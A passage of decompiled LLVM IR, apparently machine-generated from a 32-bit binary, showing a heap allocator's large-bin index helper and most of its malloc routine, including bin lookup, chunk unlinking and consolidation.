  %v7_804fd49 = and i32 %v5_804fd49, %v6_804fd49
  store i32 %v7_804fd49, i32* %v4_804fd49, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804fd41, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804fd50 = load i32, i32* @eax, align 4
  %v6_804fd63 = icmp ugt i32 %v0_804fd50, 16777215
  br i1 %v6_804fd63, label %dec_label_pc_804fd74, label %dec_label_pc_804fd65

dec_label_pc_804fd65:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804fd50, 256
  %v2_804fd52 = udiv i32 %v0_804fd50, 256
  %v2_804fd65 = call i32 @llvm.ctlz.i32(i32 %v2_804fd52, i1 true)
  %v3_804fd65 = xor i32 %v2_804fd65, 31
  %v5_804fd65 = select i1 %tmp, i32 95, i32 %v3_804fd65
  %v1_804fd68 = add nuw nsw i32 %v5_804fd65, 6
  %v2_804fd6b = urem i32 %v1_804fd68, 32
  %v4_804fd6b = icmp eq i32 %v2_804fd6b, 0
  br i1 %v4_804fd6b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804fd65
  %v5_804fd6b = lshr i32 %v0_804fd50, %v2_804fd6b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804fd65, %bb
  %v0_804fd6d = phi i32 [ %v0_804fd50, %dec_label_pc_804fd65 ], [ %v5_804fd6b, %bb ]
  %v1_804fd6d = urem i32 %v0_804fd6d, 4
  %v2_804fd70 = mul nuw nsw i32 %v5_804fd65, 4
  %v3_804fd70 = or i32 %v1_804fd6d, 32
  %v4_804fd70 = add nuw nsw i32 %v3_804fd70, %v2_804fd70
  br label %dec_label_pc_804fd74

dec_label_pc_804fd74:                             ; preds = %entry, %bb4
  %v0_804fd75 = phi i32 [ 95, %entry ], [ %v4_804fd70, %bb4 ]
  ret i32 %v0_804fd75

; uselistorder directives
  uselistorder i32 %v2_804fd6b, { 1, 0 }
  uselistorder i32 %v0_804fd50, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804fd74, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fd76 = load i32, i32* @ebp, align 4
  %v0_804fd77 = load i32, i32* @edi, align 4
  %v0_804fd78 = load i32, i32* @esi, align 4
  %v0_804fd79 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd79, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fd8b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fd8b, i32* @eax, align 4
  store i32 %v2_804fd8b, i32* %stack_var_-92, align 4
  %v2_804fd90 = call i32 @__pthread_return_void(i32 %v2_804fd8b, i32 134550239)
  store i32 %v2_804fd90, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80557d0.117 to i32), i32* %stack_var_-92, align 4
  %v1_804fd9c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80557d0.117 to i32))
  store i32 %v1_804fd9c, i32* %eax.global-to-local, align 4
  %v0_804fda4 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804fda4, -32
  br i1 %tmp, label %dec_label_pc_804fdbb, label %dec_label_pc_804fda9

dec_label_pc_804fda9:                             ; preds = %entry
  %v0_804fda9 = load i32, i32* %stack_var_-92, align 4
  %v1_804fda9 = call i32 @__errno_location(i32 %v0_804fda9)
  store i32 %v1_804fda9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fdb0 = inttoptr i32 %v1_804fda9 to i32*
  store i32 12, i32* %v1_804fdb0, align 4
  br label %dec_label_pc_805050e

dec_label_pc_804fdbb:                             ; preds = %entry
  %v1_804fdbb = add i32 %v0_804fda4, 11
  %tmp136 = icmp ult i32 %v1_804fdbb, 16
  br i1 %tmp136, label %dec_label_pc_804fdd2, label %dec_label_pc_804fdcb

dec_label_pc_804fdcb:                             ; preds = %dec_label_pc_804fdbb
  %v1_804fdcb = and i32 %v1_804fdbb, -8
  br label %dec_label_pc_804fdd2

dec_label_pc_804fdd2:                             ; preds = %dec_label_pc_804fdbb, %dec_label_pc_804fdcb
  %storemerge133 = phi i32 [ %v1_804fdcb, %dec_label_pc_804fdcb ], [ %v1_804fdbb, %dec_label_pc_804fdbb ]
  %v1_8050172 = phi i32 [ %v1_804fdcb, %dec_label_pc_804fdcb ], [ 16, %dec_label_pc_804fdbb ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_804fdd2 = load i8, i8* @global_var_805ba20.118, align 1
  %v1_804fdd2 = sext i8 %v0_804fdd2 to i32
  store i32 %v1_804fdd2, i32* @ebx, align 4
  %v3_804fdd8 = urem i8 %v0_804fdd2, 2
  %v4_804fdd8 = icmp eq i8 %v3_804fdd8, 0
  %v1_804fddb = icmp eq i1 %v4_804fdd8, false
  br i1 %v1_804fddb, label %dec_label_pc_804fdfa, label %dec_label_pc_804fddd

dec_label_pc_804fddd:                             ; preds = %dec_label_pc_804fdd2
  %v2_804fddd = icmp eq i8 %v0_804fdd2, 0
  %v1_804fddf = icmp eq i1 %v2_804fddd, false
  br i1 %v1_804fddf, label %dec_label_pc_80500dd, label %dec_label_pc_804fde5

dec_label_pc_804fde5:                             ; preds = %dec_label_pc_804fddd
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* %stack_var_-92, align 4
  %v2_804fded = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805ba20.118 to i32*))
  store i32 %v2_804fded, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80500dd

dec_label_pc_804fdfa:                             ; preds = %dec_label_pc_804fdd2
  %v11_804fdfa = trunc i32 %v1_8050172 to i8
  %v8_804fdfe = icmp ugt i8 %v11_804fdfa, %v0_804fdd2
  br i1 %v8_804fdfe, label %dec_label_pc_804fe1b, label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fdfa
  %v2_804fe04 = udiv i32 %v1_8050172, 2
  store i32 %v2_804fe04, i32* %eax.global-to-local, align 4
  %v1_804fe06 = add i32 %v2_804fe04, ptrtoint (i8* @global_var_805ba20.118 to i32)
  store i32 %v1_804fe06, i32* %ecx.global-to-local, align 4
  %v1_804fe0c = add i32 %v2_804fe04, add (i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32 -4)
  %v2_804fe0c = inttoptr i32 %v1_804fe0c to i32*
  %v3_804fe0c = load i32, i32* %v2_804fe0c, align 4
  store i32 %v3_804fe0c, i32* %edx.global-to-local, align 4
  %v1_804fe0f = icmp eq i32 %v3_804fe0c, 0
  br i1 %v1_804fe0f, label %dec_label_pc_804fe1b, label %dec_label_pc_804fe13

dec_label_pc_804fe13:                             ; preds = %dec_label_pc_804fe00
  %v1_804fe13 = add i32 %v3_804fe0c, 8
  %v2_804fe13 = inttoptr i32 %v1_804fe13 to i32*
  %v3_804fe13 = load i32, i32* %v2_804fe13, align 4
  store i32 %v3_804fe13, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe13, i32* %v2_804fe0c, align 4
  br label %dec_label_pc_804fe54

dec_label_pc_804fe1b:                             ; preds = %dec_label_pc_804fe00, %dec_label_pc_804fdfa
  %v8_804fe1b = icmp ult i32 %v1_8050172, 255
  %v6_804fe23 = icmp ugt i32 %v1_8050172, 255
  store i32 %v1_8050172, i32* @eax, align 4
  br i1 %v6_804fe23, label %dec_label_pc_804fe5c, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe1b
  %v2_804fe29 = udiv i32 %v1_8050172, 8
  store i32 %v2_804fe29, i32* %eax.global-to-local, align 4
  %v1_804fe2c = mul nuw i32 %v2_804fe29, 8
  %v2_804fe2c = add i32 %v1_804fe2c, ptrtoint (i32* @global_var_805ba4c.119 to i32)
  store i32 %v2_804fe2c, i32* %ecx.global-to-local, align 4
  %v1_804fe37 = add i32 %v1_804fe2c, add (i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), i32 12)
  %v2_804fe37 = inttoptr i32 %v1_804fe37 to i32*
  %v3_804fe37 = load i32, i32* %v2_804fe37, align 4
  store i32 %v3_804fe37, i32* %edx.global-to-local, align 4
  %v12_804fe3a = icmp eq i32 %v3_804fe37, %v2_804fe2c
  br i1 %v12_804fe3a, label %dec_label_pc_804ff58.preheader, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %dec_label_pc_804fe25
  store i32 %v1_8050172, i32* %ebx.global-to-local, align 4
  %v1_804fe46 = add i32 %v3_804fe37, 12
  %v2_804fe46 = inttoptr i32 %v1_804fe46 to i32*
  %v3_804fe46 = load i32, i32* %v2_804fe46, align 4
  store i32 %v3_804fe46, i32* %eax.global-to-local, align 4
  %v2_804fe49 = or i32 %v1_8050172, 4
  %v3_804fe49 = add i32 %v3_804fe37, %v2_804fe49
  %v4_804fe49 = inttoptr i32 %v3_804fe49 to i32*
  %v5_804fe49 = load i32, i32* %v4_804fe49, align 4
  %v6_804fe49 = or i32 %v5_804fe49, 1
  store i32 %v6_804fe49, i32* %v4_804fe49, align 4
  %v0_804fe4e = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe4e = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fe4e = add i32 %v1_804fe4e, 12
  %v3_804fe4e = inttoptr i32 %v2_804fe4e to i32*
  store i32 %v0_804fe4e, i32* %v3_804fe4e, align 4
  %v0_804fe51 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fe51 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe51 = add i32 %v1_804fe51, 8
  %v3_804fe51 = inttoptr i32 %v2_804fe51 to i32*
  store i32 %v0_804fe51, i32* %v3_804fe51, align 4
  br label %dec_label_pc_804fe54

dec_label_pc_804fe54:                             ; preds = %dec_label_pc_804fe13, %dec_label_pc_804fe42
  %v0_804fe54 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe54 = add i32 %v0_804fe54, 8
  store i32 %v1_804fe54, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_804fe5c:                             ; preds = %dec_label_pc_804fe1b
  %v0_804fe60 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fe60, i32* %eax.global-to-local, align 4
  %v3_804fe65 = and i8 %v0_804fdd2, 2
  %v4_804fe65 = icmp eq i8 %v3_804fe65, 0
  br i1 %v4_804fe65, label %dec_label_pc_804ff58.preheader, label %dec_label_pc_804fe72

dec_label_pc_804fe72:                             ; preds = %dec_label_pc_804fe5c
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* %stack_var_-92, align 4
  %v2_804fe7a = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805ba20.118 to i32*))
  store i32 %v2_804fe7a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff58.preheader

dec_label_pc_804ff58.preheader:                   ; preds = %dec_label_pc_804fe72, %dec_label_pc_804fe25, %dec_label_pc_804fe5c
  %stack_var_-40.0.ph = phi i32 [ %v2_804fe29, %dec_label_pc_804fe25 ], [ %v0_804fe60, %dec_label_pc_804fe72 ], [ %v0_804fe60, %dec_label_pc_804fe5c ]
  %v1_804feae = add i32 %v1_8050172, 16
  %v0_804ff58109 = load i32, i32* @global_var_805ba60.122, align 32
  store i32 %v0_804ff58109, i32* @ebp, align 4
  %v9_804ff5e115 = icmp eq i32 %v0_804ff58109, 134593108
  %v1_804ff64117 = icmp eq i1 %v9_804ff5e115, false
  br i1 %v1_804ff64117, label %dec_label_pc_804fe87, label %dec_label_pc_804ff6a

dec_label_pc_804fe87:                             ; preds = %dec_label_pc_804ff58.preheader, %bb82
  %v0_804ff58118 = phi i32 [ %v0_804ff58, %bb82 ], [ %v0_804ff58109, %dec_label_pc_804ff58.preheader ]
  %v1_804fe87 = add i32 %v0_804ff58118, 4
  %v2_804fe87 = inttoptr i32 %v1_804fe87 to i32*
  %v3_804fe87 = load i32, i32* %v2_804fe87, align 4
  %v1_804fe8a = add i32 %v0_804ff58118, 12
  %v2_804fe8a = inttoptr i32 %v1_804fe8a to i32*
  %v3_804fe8a = load i32, i32* %v2_804fe8a, align 4
  store i32 %v3_804fe8a, i32* %edx.global-to-local, align 4
  %v1_804fe8d = and i32 %v3_804fe87, -4
  store i32 %v1_804fe8d, i32* @edi, align 4
  br i1 %v6_804fe23, label %dec_label_pc_804feb9, label %dec_label_pc_804fe9a

dec_label_pc_804fe9a:                             ; preds = %dec_label_pc_804fe87
  %v9_804fe9a = icmp eq i32 %v3_804fe8a, 134593108
  %v1_804fea0 = icmp eq i1 %v9_804fe9a, false
  br i1 %v1_804fea0, label %dec_label_pc_804feb9, label %dec_label_pc_804fea2

dec_label_pc_804fea2:                             ; preds = %dec_label_pc_804fe9a
  %v1_804fea2 = load i32, i32* @global_var_805ba50.120, align 16
  %v12_804fea2 = icmp eq i32 %v0_804ff58118, %v1_804fea2
  %v1_804fea8 = icmp eq i1 %v12_804fea2, false
  br i1 %v1_804fea8, label %dec_label_pc_804feb9, label %dec_label_pc_804feaa

dec_label_pc_804feaa:                             ; preds = %dec_label_pc_804fea2
  store i32 %v1_804feae, i32* %eax.global-to-local, align 4
  %v6_804feb3 = icmp ugt i32 %v1_804fe8d, %v1_804feae
  br i1 %v6_804feb3, label %dec_label_pc_8050498, label %dec_label_pc_804feb9

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804feaa, %dec_label_pc_804fea2, %dec_label_pc_804fe9a, %dec_label_pc_804fe87
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804fe8a, i32* @global_var_805ba60.122, align 4
  %v2_804fec1 = add i32 %v3_804fe8a, 8
  %v3_804fec1 = inttoptr i32 %v2_804fec1 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v3_804fec1, align 4
  %v0_804fec4 = load i32, i32* @edi, align 4
  %v15_804fec4 = icmp eq i32 %v0_804fec4, %v1_8050172
  br i1 %v15_804fec4, label %dec_label_pc_80504d9, label %dec_label_pc_804fece

dec_label_pc_804fece:                             ; preds = %dec_label_pc_804feb9
  %v6_804fed4 = icmp ugt i32 %v0_804fec4, 255
  br i1 %v6_804fed4, label %dec_label_pc_804fee7, label %dec_label_pc_804fed6

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fece
  %v2_804fed8 = udiv i32 %v0_804fec4, 8
  store i32 %v2_804fed8, i32* %esi.global-to-local, align 4
  %v1_804fedb = mul nuw i32 %v2_804fed8, 8
  %v2_804fedb = add i32 %v1_804fedb, 134593100
  store i32 %v2_804fedb, i32* @ebx, align 4
  %v1_804fee2 = add i32 %v1_804fedb, 134593108
  %v2_804fee2 = inttoptr i32 %v1_804fee2 to i32*
  %v3_804fee2 = load i32, i32* %v2_804fee2, align 4
  store i32 %v3_804fee2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff30

dec_label_pc_804fee7:                             ; preds = %dec_label_pc_804fece
  store i32 %v0_804fec4, i32* @eax, align 4
  %v0_804fee9 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fee9, i32* %esi.global-to-local, align 4
  %v1_804fef0 = mul i32 %v0_804fee9, 8
  %v2_804fef0 = add i32 %v1_804fef0, ptrtoint (i32* @global_var_805ba4c.119 to i32)
  store i32 %v2_804fef0, i32* %eax.global-to-local, align 4
  %v1_804fef7 = add i32 %v1_804fef0, add (i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), i32 8)
  %v2_804fef7 = inttoptr i32 %v1_804fef7 to i32*
  %v3_804fef7 = load i32, i32* %v2_804fef7, align 4
  store i32 %v3_804fef7, i32* %edx.global-to-local, align 4
  %v12_804fefa = icmp eq i32 %v3_804fef7, %v2_804fef0
  store i32 %v3_804fef7, i32* @ebx, align 4
  br i1 %v12_804fefa, label %dec_label_pc_804ff30, label %dec_label_pc_804ff04

dec_label_pc_804ff04:                             ; preds = %dec_label_pc_804fee7
  %v1_804ff04 = add i32 %v1_804fef0, add (i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), i32 12)
  %v2_804ff04 = inttoptr i32 %v1_804ff04 to i32*
  %v3_804ff04 = load i32, i32* %v2_804ff04, align 4
  store i32 %v3_804ff04, i32* @ebx, align 4
  %v0_804ff07 = load i32, i32* @edi, align 4
  %v2_804ff07 = add i32 %v3_804ff04, 4
  %v3_804ff07 = inttoptr i32 %v2_804ff07 to i32*
  %v4_804ff07 = load i32, i32* %v3_804ff07, align 4
  %v10_804ff07 = icmp ult i32 %v0_804ff07, %v4_804ff07
  %v1_804ff0a = icmp eq i1 %v10_804ff07, false
  br i1 %v1_804ff0a, label %dec_label_pc_804ff12, label %dec_label_pc_804ff30

dec_label_pc_804ff12:                             ; preds = %dec_label_pc_804ff04
  %v1_804ff14 = or i32 %v0_804ff07, 1
  store i32 %v1_804ff14, i32* %eax.global-to-local, align 4
  store i32 %v3_804fef7, i32* %ebx.global-to-local, align 4
  %v2_804ff28101 = add i32 %v3_804fef7, 4
  %v3_804ff28102 = inttoptr i32 %v2_804ff28101 to i32*
  %v4_804ff28103 = load i32, i32* %v3_804ff28102, align 4
  %v10_804ff28105 = icmp ult i32 %v1_804ff14, %v4_804ff28103
  br i1 %v10_804ff28105, label %dec_label_pc_804ff19, label %dec_label_pc_804ff2d

dec_label_pc_804ff19:                             ; preds = %dec_label_pc_804ff12, %dec_label_pc_804ff19
  %v0_804ff2d106 = phi i32 [ %v3_804ff1d, %dec_label_pc_804ff19 ], [ %v3_804fef7, %dec_label_pc_804ff12 ]
  store i32 %v0_804ff2d106, i32* %ecx.global-to-local, align 4
  %v1_804ff1d = add i32 %v0_804ff2d106, 8
  %v2_804ff1d = inttoptr i32 %v1_804ff1d to i32*
  %v3_804ff1d = load i32, i32* %v2_804ff1d, align 4
  store i32 %v3_804ff1d, i32* %ecx.global-to-local, align 4
  store i32 %v3_804ff1d, i32* %ebx.global-to-local, align 4
  %v2_804ff28 = add i32 %v3_804ff1d, 4
  %v3_804ff28 = inttoptr i32 %v2_804ff28 to i32*
  %v4_804ff28 = load i32, i32* %v3_804ff28, align 4
  %v10_804ff28 = icmp ult i32 %v1_804ff14, %v4_804ff28
  br i1 %v10_804ff28, label %dec_label_pc_804ff19, label %dec_label_pc_804ff2d

dec_label_pc_804ff2d:                             ; preds = %dec_label_pc_804ff19, %dec_label_pc_804ff12
  %v0_804ff2d.lcssa = phi i32 [ %v3_804fef7, %dec_label_pc_804ff12 ], [ %v3_804ff1d, %dec_label_pc_804ff19 ]
  %v1_804ff2d = add i32 %v0_804ff2d.lcssa, 12
  %v2_804ff2d = inttoptr i32 %v1_804ff2d to i32*
  %v3_804ff2d = load i32, i32* %v2_804ff2d, align 4
  store i32 %v3_804ff2d, i32* @ebx, align 4
  br label %dec_label_pc_804ff30

dec_label_pc_804ff30:                             ; preds = %dec_label_pc_804fed6, %dec_label_pc_804ff04, %dec_label_pc_804fee7, %dec_label_pc_804ff2d
  %v0_804ff30 = phi i32 [ %v0_804fee9, %dec_label_pc_804fee7 ], [ %v0_804fee9, %dec_label_pc_804ff2d ], [ %v0_804fee9, %dec_label_pc_804ff04 ], [ %v2_804fed8, %dec_label_pc_804fed6 ]
  %stack_var_-64.1 = phi i32 [ %v3_804fef7, %dec_label_pc_804fee7 ], [ %v0_804ff2d.lcssa, %dec_label_pc_804ff2d ], [ %v2_804fef0, %dec_label_pc_804ff04 ], [ %v3_804fee2, %dec_label_pc_804fed6 ]
  %v1_804ff32 = urem i32 %v0_804ff30, 32
  %v2_804ff32 = icmp eq i32 %v1_804ff32, 0
  store i32 %v1_804ff32, i32* %esi.global-to-local, align 4
  store i32 %v1_804ff32, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804ff3c = sdiv i32 %v0_804ff30, 32
  store i32 %v2_804ff3c, i32* %edx.global-to-local, align 4
  br i1 %v2_804ff32, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804ff30
  %v5_804ff3f = shl i32 1, %v1_804ff32
  store i32 %v5_804ff3f, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804ff30, %bb
  %v5_804ff41 = phi i32 [ 1, %dec_label_pc_804ff30 ], [ %v5_804ff3f, %bb ]
  %v1_804ff41 = mul nsw i32 %v2_804ff3c, 4
  %v2_804ff41 = add i32 %v1_804ff41, ptrtoint (i32* @global_var_805bd54.123 to i32)
  %v3_804ff41 = inttoptr i32 %v2_804ff41 to i32*
  %v4_804ff41 = load i32, i32* %v3_804ff41, align 4
  %v6_804ff41 = or i32 %v4_804ff41, %v5_804ff41
  store i32 %v6_804ff41, i32* %v3_804ff41, align 4
  %v0_804ff48 = load i32, i32* @ebx, align 4
  %v1_804ff48 = load i32, i32* @ebp, align 4
  %v2_804ff48 = add i32 %v1_804ff48, 12
  %v3_804ff48 = inttoptr i32 %v2_804ff48 to i32*
  store i32 %v0_804ff48, i32* %v3_804ff48, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804ff4f = load i32, i32* @ebp, align 4
  %v2_804ff4f = add i32 %v1_804ff4f, 8
  %v3_804ff4f = inttoptr i32 %v2_804ff4f to i32*
  store i32 %stack_var_-64.1, i32* %v3_804ff4f, align 4
  %v0_804ff52 = load i32, i32* @ebp, align 4
  %v1_804ff52 = load i32, i32* @esi, align 4
  %v2_804ff52 = add i32 %v1_804ff52, 12
  %v3_804ff52 = inttoptr i32 %v2_804ff52 to i32*
  store i32 %v0_804ff52, i32* %v3_804ff52, align 4
  %v0_804ff55 = load i32, i32* @ebp, align 4
  %v1_804ff55 = load i32, i32* @ebx, align 4
  %v2_804ff55 = add i32 %v1_804ff55, 8
  %v3_804ff55 = inttoptr i32 %v2_804ff55 to i32*
  store i32 %v0_804ff55, i32* %v3_804ff55, align 4
  %v0_804ff58 = load i32, i32* @global_var_805ba60.122, align 32
  store i32 %v0_804ff58, i32* @ebp, align 4
  %v9_804ff5e = icmp eq i32 %v0_804ff58, 134593108
  %v1_804ff64 = icmp eq i1 %v9_804ff5e, false
  br i1 %v1_804ff64, label %dec_label_pc_804fe87, label %dec_label_pc_804ff6a

dec_label_pc_804ff6a:                             ; preds = %bb82, %dec_label_pc_804ff58.preheader
  br i1 %v8_804fe1b, label %dec_label_pc_804fff8, label %dec_label_pc_804ff78

dec_label_pc_804ff78:                             ; preds = %dec_label_pc_804ff6a
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804ff7c = mul i32 %stack_var_-40.0.ph, 8
  %v2_804ff7c = add i32 %v1_804ff7c, ptrtoint (i32* @global_var_805ba4c.119 to i32)
  store i32 %v2_804ff7c, i32* %edx.global-to-local, align 4
  %v1_804ff83 = add i32 %v1_804ff7c, add (i32 ptrtoint (i32* @global_var_805ba4c.119 to i32), i32 12)
  %v2_804ff83 = inttoptr i32 %v1_804ff83 to i32*
  %storemerge1.pre = load i32, i32* %v2_804ff83, align 4
  br label %dec_label_pc_804fff4

dec_label_pc_804ff88:                             ; preds = %dec_label_pc_804fff4
  %v1_804ff88 = add i32 %v4_804ff9f, 4
  %v2_804ff88 = inttoptr i32 %v1_804ff88 to i32*
  %v3_804ff88 = load i32, i32* %v2_804ff88, align 4
  store i32 %v3_804ff88, i32* %ebx.global-to-local, align 4
  %v1_804ff8b = add i32 %v4_804ff9f, 12
  %v2_804ff8b = inttoptr i32 %v1_804ff8b to i32*
  %v3_804ff8b = load i32, i32* %v2_804ff8b, align 4
  store i32 %v3_804ff8b, i32* @ecx, align 4
  %v1_804ff8e = and i32 %v3_804ff88, -4
  store i32 %v1_804ff8e, i32* @ebx, align 4
  %v10_804ff91 = icmp ult i32 %v1_804ff8e, %v1_8050172
  br i1 %v10_804ff91, label %dec_label_pc_804fff4, label %dec_label_pc_804ff97

dec_label_pc_804ff97:                             ; preds = %dec_label_pc_804ff88
  %v1_804ff97 = add i32 %v4_804ff9f, 8
  %v2_804ff97 = inttoptr i32 %v1_804ff97 to i32*
  %v3_804ff97 = load i32, i32* %v2_804ff97, align 4
  store i32 %v3_804ff97, i32* @edx, align 4
  %v1_804ff9a = add i32 %v3_804ff97, 12
  %v2_804ff9a = inttoptr i32 %v1_804ff9a to i32*
  %v3_804ff9a = load i32, i32* %v2_804ff9a, align 4
  %v15_804ff9a = icmp eq i32 %v3_804ff9a, %v4_804ff9f
  %v1_804ff9d = icmp eq i1 %v15_804ff9a, false
  br i1 %v1_804ff9d, label %dec_label_pc_804ffa4, label %dec_label_pc_804ff9f

dec_label_pc_804ff9f:                             ; preds = %dec_label_pc_804ff97
  %v1_804ff9f = add i32 %v3_804ff8b, 8
  %v2_804ff9f = inttoptr i32 %v1_804ff9f to i32*
  %v3_804ff9f = load i32, i32* %v2_804ff9f, align 4
  %v15_804ff9f = icmp eq i32 %v3_804ff9f, %v4_804ff9f
  br i1 %v15_804ff9f, label %dec_label_pc_804ffa9, label %dec_label_pc_804ffa4

dec_label_pc_804ffa4:                             ; preds = %dec_label_pc_804ff9f, %dec_label_pc_804ff97
  %v0_804ffa4 = call i32 @abort()
  store i32 %v0_804ffa4, i32* %eax.global-to-local, align 4
  %v0_804ffa9.pre = load i32, i32* @ebx, align 4
  %v0_804ffaf.pre = load i32, i32* @ecx, align 4
  %v1_804ffaf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ffa9

dec_label_pc_804ffa9:                             ; preds = %dec_label_pc_804ff9f, %dec_label_pc_804ffa4
  %v1_804ffaf = phi i32 [ %v3_804ff97, %dec_label_pc_804ff9f ], [ %v1_804ffaf.pre, %dec_label_pc_804ffa4 ]
  %v0_804ffaf = phi i32 [ %v3_804ff8b, %dec_label_pc_804ff9f ], [ %v0_804ffaf.pre, %dec_label_pc_804ffa4 ]
  %v0_804ffa9 = phi i32 [ %v1_804ff8e, %dec_label_pc_804ff9f ], [ %v0_804ffa9.pre, %dec_label_pc_804ffa4 ]
  %v5_804ffab = sub i32 %v0_804ffa9, %v1_8050172
  store i32 %v5_804ffab, i32* %esi.global-to-local, align 4
  %v2_804ffaf = add i32 %v1_804ffaf, 12
  %v3_804ffaf = inttoptr i32 %v2_804ffaf to i32*
  store i32 %v0_804ffaf, i32* %v3_804ffaf, align 4
  %v0_804ffb2 = load i32, i32* @edx, align 4
  %v1_804ffb2 = load i32, i32* @ecx, align 4
  %v2_804ffb2 = add i32 %v1_804ffb2, 8
  %v3_804ffb2 = inttoptr i32 %v2_804ffb2 to i32*
  store i32 %v0_804ffb2, i32* %v3_804ffb2, align 4
  %v0_804ffb5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffb5 = add i32 %v0_804ffb5, 8
  store i32 %v1_804ffb5, i32* %ecx.global-to-local, align 4
  %v0_804ffb8 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_804ffb8, 16
  br i1 %tmp137, label %dec_label_pc_80504e7, label %dec_label_pc_804ffc1

dec_label_pc_804ffc1:                             ; preds = %dec_label_pc_804ffa9
  %v2_804ffc5 = add i32 %v0_804ffb5, %v1_8050172
  store i32 %v2_804ffc5, i32* %edx.global-to-local, align 4
  %v1_804ffc8 = or i32 %v1_8050172, 1
  store i32 %v1_804ffc8, i32* %ebx.global-to-local, align 4
  %v2_804ffcb = add i32 %v0_804ffb5, 4
  %v3_804ffcb = inttoptr i32 %v2_804ffcb to i32*
  store i32 %v1_804ffc8, i32* %v3_804ffcb, align 4
  %v0_804ffce = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffd0 = or i32 %v0_804ffce, 1
  store i32 %v1_804ffd0, i32* %eax.global-to-local, align 4
  %v0_804ffd3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd3 = load i32, i32* @ebp, align 4
  %v2_804ffd3 = add i32 %v1_804ffd3, 8
  %v3_804ffd3 = inttoptr i32 %v2_804ffd3 to i32*
  store i32 %v0_804ffd3, i32* %v3_804ffd3, align 4
  %v0_804ffd6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd6 = load i32, i32* @ebp, align 4
  %v2_804ffd6 = add i32 %v1_804ffd6, 12
  %v3_804ffd6 = inttoptr i32 %v2_804ffd6 to i32*
  store i32 %v0_804ffd6, i32* %v3_804ffd6, align 4
  %v0_804ffd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd9 = add i32 %v0_804ffd9, 8
  %v2_804ffd9 = inttoptr i32 %v1_804ffd9 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_804ffd9, align 4
  %v0_804ffe0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffe0 = add i32 %v0_804ffe0, 12
  %v2_804ffe0 = inttoptr i32 %v1_804ffe0 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_804ffe0, align 4
  %v0_804ffe7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffe7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ffe7 = add i32 %v1_804ffe7, 4
  %v3_804ffe7 = inttoptr i32 %v2_804ffe7 to i32*
  store i32 %v0_804ffe7, i32* %v3_804ffe7, align 4
  %v0_804ffea = load i32, i32* %esi.global-to-local, align 4
